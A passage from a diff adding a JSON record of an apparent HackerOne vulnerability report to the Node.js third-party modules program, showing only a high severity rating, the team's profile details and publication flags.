config.</p>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://nodejs.org/en/security/", 
+            "about": "This program is used to handle vulnerabilities in the Node.js ecosystem.", 
+            "twitter_handle": "", 
+            "name": "Node.js third-party modules"
+        }, 
+        "handle": "nodejs-ecosystem", 
+        "url": "https://hackerone.com/nodejs-ecosystem", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/023/949/309112251b444244d95977d1299148aae6482789_small.?1508679627", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/023/949/c1f5f15ac094c1327c13dd19f55dbcb7411272bd_medium.?1508679627"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 23949, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
